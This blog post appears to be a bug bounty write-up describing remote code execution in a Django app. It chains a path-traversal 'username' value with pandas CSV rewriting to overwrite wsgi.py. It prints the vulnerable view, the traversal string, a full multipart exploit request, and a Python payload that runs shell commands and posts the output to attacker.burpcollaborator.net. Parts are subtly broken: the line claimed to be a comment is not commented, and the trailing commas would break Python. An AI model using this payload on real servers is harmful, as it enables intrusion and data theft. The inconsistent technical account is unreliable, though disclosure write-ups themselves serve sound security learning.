---

title: "How I Chained Directory Traversal and CSV Parser Abuse for RCE in a Django App"
date: 2025-06-30
categories: [security, django, rce]
tags: [bugbounty, csv, traversal, django, rce]

---

While testing a web application as part of a bug bounty program, I uncovered a critical RCE vulnerability by chaining directory traversal with a subtle CSV parsing abuse. The exploit chain involved a combination of directory traversal and subtle abuse of how the application used the `pandas` CSV parser, ultimately allowing me to overwrite the `wsgi.py` file and execute arbitrary code server-side.

## Application Behavior

The vulnerable endpoint allowed users to upload CSV files, process them using `pandas`, and save the result to disk. The target function looked something like this:

```python

        username = request.data.get("username")
        upload_file = request.FILES.get("csv_file")
        temp_path = f"/tmp/{upload_file.name}"
        with open(temp_path, "wb") as out_file:
            for chunk in upload_file.chunks():
                out_file.write(chunk)

        # Parse uploaded CSV
        df = pandas.read_csv(temp_path)

        # Determine output path
        base_dir = Path(__file__).resolve().parent.parent
        save_dir = os.path.join(base_dir, "data_store", username)
        os.makedirs(save_dir, exist_ok=True)

        final_path = os.path.join(save_dir, upload_file.name)
        if os.path.exists(final_path):
            os.remove(final_path)
        df.to_csv(final_path, index=False, encoding="utf-8")
        return Response({"status": "success"}, status=200)
    except Exception as e:
        return Response({"error": str(e)}, status=500)

```

There are two key observations here:

- The `username` field is directly used in the filesystem path without sanitization.
- The `pandas.read_csv()` and `df.to_csv()` roundtrip occurs before saving the file.

This setup made it possible to craft a payload that hijacks the file write location and executes code on the system.

## From Path Traversal to File Overwrite

The `username` field was trusted and used to construct a path like `data_store/<username>/file.csv`. I simply submitted a value like:

```
../../../../../../app/backend/backend/

```

As a result, the application wrote my uploaded file to:

```
/app/backend/backend/file.csv
```

## Crafting a Valid Payload Through CSV

The hard part was getting code into `wsgi.py` without triggering a syntax error. The app parses the file with `pandas.read_csv()` and then re-serializes it with `to_csv()`. This means my uploaded file would be rewritten before it landed in `wsgi.py`.

Here’s what `pandas.to_csv()` does:

- Writes headers by default.
- Pads rows with commas to match the maximum column count.
- Writes each cell value as a string, potentially quoting it.

So I needed my payload to:

1. Avoid being mangled during CSV parsing.
2. Still be valid Python after extra commas were appended.

The trick was to put my malicious line in a comment using `#`. This didn’t hide it from pandas—it parsed it like any other row—but ensured that any trailing junk added by `to_csv()` would be ignored by Python when the file ran. 
Python ignores everything after a `#` on a line, so even if `pandas.to_csv()` appends extra commas or whitespace, they’re treated as part of the comment and discarded by the interpreter.

Here’s the actual payload line embedded in a seemingly innocent CSV:

```python
# VALID CSV DATA
import os,requests;from django.core.wsgi import get_wsgi_application;os.environ.setdefault('DJANGO_SETTINGS_MODULE','backend.settings');r=os.popen('whoami&&id&&hostname').read();requests.post('<http://attacker.burpcollaborator.net>',data={'r':r});application = get_wsgi_application();,,,,,

```

After going through pandas’ processing, it still looked like a comment line to Python, with enough real logic inside to get code execution and reassign `application`, satisfying Django’s expectations.

## Picking the Right Target for Code Execution

At this stage, the file overwrite was working — but to escalate it to RCE, I needed to identify a file that the application would **automatically load or execute after modification**, since I had **no direct ability to invoke the overwritten file manually**. This meant finding a server-side script that Django would re-import or re-run implicitly on access. That led me to `wsgi.py`.

## Why wsgi.py?

From the [WSGI specification](https://wsgi.readthedocs.io/en/latest/), the `wsgi.py` file exists to expose a callable named `application` that acts as the entry point for the web server to interact with a Python app. In Django, this is typically done using:

```python
from django.core.wsgi import get_wsgi_application
application = get_wsgi_application()

```

During testing, a verbose error message gave away the project’s file structure. The traceback included a path like:

```
/app/backend/backend/
```

This nested layout is exactly what you get when a Django app is created using `django-admin startproject backend` — where the outer `backend/` is the project root and the inner one holds settings, `wsgi.py`, and other core files.

That made `wsgi.py` the perfect target. I couldn’t *run* arbitrary files, only overwrite them — so I needed something the server would execute on its own. Django’s development server watches `wsgi.py` for changes and automatically reloads it when modified. That meant just touching the file was enough to trigger execution. By placing my payload inside a Python comment and ending with a clean `application = get_wsgi_application()` line, I preserved the structure Django expected while slipping in remote code execution.

## Final Exploit Request

Here’s the trimmed HTTP request used to achieve the overwrite:

```http

POST /api/endpoint HTTP/1.1
Host: target.url
Content-Type: multipart/form-data; boundary=---------------------------boundary
Cookie: session=...

-----------------------------boundary
Content-Disposition: form-data; name="fleet_csv"; filename="wsgi.py"
Content-Type: text/csv

# VALID CSV DATA
import os,requests;from django.core.wsgi import get_wsgi_application;os.environ.setdefault('DJANGO_SETTINGS_MODULE','backend.settings');r=os.popen('whoami&&id&&hostname').read();requests.post('<http://attacker.burpcollaborator.net>',data={'r':r});application = get_wsgi_application();,,,,,

-----------------------------boundary
Content-Disposition: form-data; name="report_date"

2025-01-01
-----------------------------boundary
Content-Disposition: form-data; name="username"

../../../../../../app/backend/backend/
-----------------------------boundary--

```

The response confirmed success:

```json
{"status": "success"}
```

Seconds later, my server received the callback with command output.

## Conclusion

This exploit was possible due to:

- Unsanitized use of user input in filesystem paths.
- Unsafe file parsing and rewriting with `pandas`.
- Django’s auto-reloading behavior in debug mode.

By combining these behaviors, I was able to go from a basic file upload to full RCE on the server. The real lesson here is that even something as seemingly harmless as CSV parsing can become dangerous in the wrong context—especially when paired with filesystem access and auto-executing server files.